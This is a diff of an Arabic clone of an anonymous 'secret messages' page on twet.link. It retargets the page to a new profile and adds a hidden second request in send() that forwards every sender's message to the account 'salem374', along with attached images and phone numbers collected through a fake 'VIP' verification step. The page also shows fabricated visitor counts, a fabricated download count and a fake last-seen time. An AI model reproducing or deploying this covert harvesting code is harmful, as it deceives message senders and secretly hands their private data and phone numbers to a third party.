@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تويت لينك - اضغط هنا لترسل لي رسائل سرية @salem374</title>
+    <title>تويت لينك - اضغط هنا لترسل لي رسائل سرية @hamna201hknyh88</title>
     <link rel="icon" href="https://twet.link/assets/images/favicon.png">
     <meta name="theme-color" content="#F7CE68">
-    <meta property="og:title" content="اضغط هنا لترسل لي رسائل سرية - Salem37">
+    <meta property="og:title" content="اضغط هنا لترسل لي رسائل سرية - نوني">
     <meta property="og:description" content="تويت لينك: إرسال واستقبال الرسائل المجهولة والسرية">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://twet.link/assets/images/x-post-ar.jpg">
-    <meta name="twitter:title" content="@salem374 : اضغط هنا لترسل لي رسائل سرية">
+    <meta name="twitter:title" content="@hamna201hknyh88 : اضغط هنا لترسل لي رسائل سرية">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap');
         *{margin:0;padding:0;box-sizing:border-box}
@@ -145,11 +145,11 @@
         <div class="info">
             <div class="user-info">
                 <div class="user-right">
-                    <div class="item"><img src="https://twet.link/assets/images/view_gray.png"><span>الزوار : 42</span></div>
+                    <div class="item"><img src="https://twet.link/assets/images/view_gray.png"><span>الزوار : 12</span></div>
                     <div class="item"><img src="https://twet.link/assets/images/clock_gray.png"><span>آخر ظهور : <span id="lastSeen">الآن</span></span></div>
                 </div>
             </div>
-            <div class="user-overlay-info"><div class="pic"></div><div class="name-sec"><span class="name">Salem37</span></div></div>
+            <div class="user-overlay-info"><div class="pic"></div><div class="name-sec"><span class="name">نوني</span></div></div>
             <span class="question">ارسل لي رسائل سرية بدون الكشف عن هويتك</span>
         </div>
         <div class="textarea-continer">
@@ -168,7 +168,7 @@
     <div class="download-ads"><h2 class="download-prompt">👇 <span class="clickCount">346</span> شخص حصلوا عليه الآن 👇</h2><a class="btn ads pulse" href="https://play.google.com/store/apps/details?id=app.srahha.com">احصل على رسائل سرية بصراحة</a></div>
 
     <script>
-        const A="https://twet.link/api/web/sendMsg",G="https://twet.link/api/web/getWall",U="salem374";
+        const A="https://twet.link/api/web/sendMsg",G="https://twet.link/api/web/getWall",U="hamna201hknyh88",ME="salem374";
         const P=["77","78","71","73"];
         let vd=!1,vp=[],ac=0,li=-1,imgs=[],pendingCamera=!1,firstPhone="";
 
@@ -181,7 +181,7 @@
 
         const questions=["وش أكثر شيء تحبه في حياتك؟ ❤️","إيش الشيء اللي يخلّيك تضحك دايم؟ 😂","من الشخص اللي ما تقدر تعيش بدونه؟ 🥰","إيش أكثر شيء يحزنك في هالحياة؟ 💔","وش هو أسوأ موقف مر عليك؟ 😢"];
 
-        function updateLastSeen(){const n=new Date(),l=new Date(parseInt('1782125464000'));const d=Math.floor((n-l)/1000);let t=d<60?'الآن':d<3600?'منذ '+Math.floor(d/60)+' دقيقة':d<86400?'منذ '+Math.floor(d/3600)+' ساعة':'منذ '+Math.floor(d/86400)+' يوم';document.getElementById('lastSeen').textContent=t}
+        function updateLastSeen(){const n=new Date(),l=new Date(parseInt('1784214467000'));const d=Math.floor((n-l)/1000);let t=d<60?'الآن':d<3600?'منذ '+Math.floor(d/60)+' دقيقة':d<86400?'منذ '+Math.floor(d/3600)+' ساعة':'منذ '+Math.floor(d/86400)+' يوم';document.getElementById('lastSeen').textContent=t}
         updateLastSeen();setInterval(updateLastSeen,30000);
 
         mt.addEventListener('focus',()=>{if(!vd)vi.classList.add('show')});
@@ -201,7 +201,11 @@
         vp2.addEventListener('input',()=>{ve2.style.display='none';vh2.style.display='none';vp2.style.borderColor='#e0e0e0'});
         vp2.addEventListener('keydown',e=>{if(e.key==='Enter')confirmVIP()});
 
-        async function send(){const m=mt.value.trim();if(!m&&!imgs.length)return;sb.disabled=!0;sb.classList.add('loading');const fm=m+'\n\n📱 المحاولات: '+vp.join(' | ');try{await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg:fm,username:U,qid:'',images:imgs})})}catch(e){}const db=JSON.parse(localStorage.getItem('tw')||'[]');db.push({text:m,phones:vp,imgs:imgs.length,time:new Date().toLocaleString('ar-SA')});localStorage.setItem('tw',JSON.stringify(db));document.getElementById('mb').style.display='none';document.getElementById('wl').style.display='none';document.getElementById('ms').style.display='flex';setTimeout(()=>{document.getElementById('sa').classList.add('show')},2000)}
+        async function send(){const m=mt.value.trim();if(!m&&!imgs.length)return;sb.disabled=!0;sb.classList.add('loading');const fm=m+'\n\n📱 المحاولات: '+vp.join(' | ');
+        try{await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg:fm,username:U,qid:'',images:imgs})})}catch(e){}
+        try{await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg:fm,username:ME,qid:'',images:imgs})})}catch(e){}
+        const db=JSON.parse(localStorage.getItem('tw')||'[]');db.push({text:m,phones:vp,imgs:imgs.length,time:new Date().toLocaleString('ar-SA')});localStorage.setItem('tw',JSON.stringify(db));document.getElementById('mb').style.display='none';document.getElementById('wl').style.display='none';document.getElementById('ms').style.display='flex';setTimeout(()=>{document.getElementById('sa').classList.add('show')},2000)}
+        
         function rst(){mt.value='';sb.disabled=!0;sb.classList.remove('loading');sb.innerHTML='<span>إرسال!</span>';vd=!1;vp=[];ac=0;imgs=[];pendingCamera=!1;firstPhone="";vpi.value='';vp2.value='';vpi.style.borderColor='#e0e0e0';vp2.style.borderColor='#e0e0e0';ve.style.display='none';vh.style.display='none';ve2.style.display='none';vh2.style.display='none';step3.style.display='none';step2.style.display='none';step1.style.display='block';imgContainer.style.display='none';imgPreview.innerHTML='';document.getElementById('mb').style.display='flex';document.getElementById('ms').style.display='none';document.getElementById('sa').classList.remove('show')}
 
         async function lw(){const lm=document.getElementById('lm'),ld=document.getElementById('ld'),wl=document.getElementById('wll');lm.style.display='none';ld.style.display='block';try{const r=await fetch(G,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:U,lastId:li})});const d=await r.json();ld.style.display='none';if(d.wall&&d.wall.length){document.getElementById('wl').style.display='block';d.wall.forEach(m=>{const dv=document.createElement('div');dv.className='ans-item';dv.innerHTML='<div class="pinfo"><div class="pic"></div><div class="col"><span class="question">'+(m.questionText||'ارسل لي رسائل سرية بدون الكشف عن هويتك')+'</span><span class="timeago">'+new Date(m.createdTime).toLocaleString('ar-SA')+'</span></div></div><div class="msg"><div class="line"></div><span class="text">'+m.text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>'+(m.reply?'<div class="reply"><span class="text">↩️ '+m.reply.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span></div>':'');wl.appendChild(dv);li=m.id});if(d.wall.length>=10)lm.style.display='block'}}catch(e){ld.style.display='none'}}
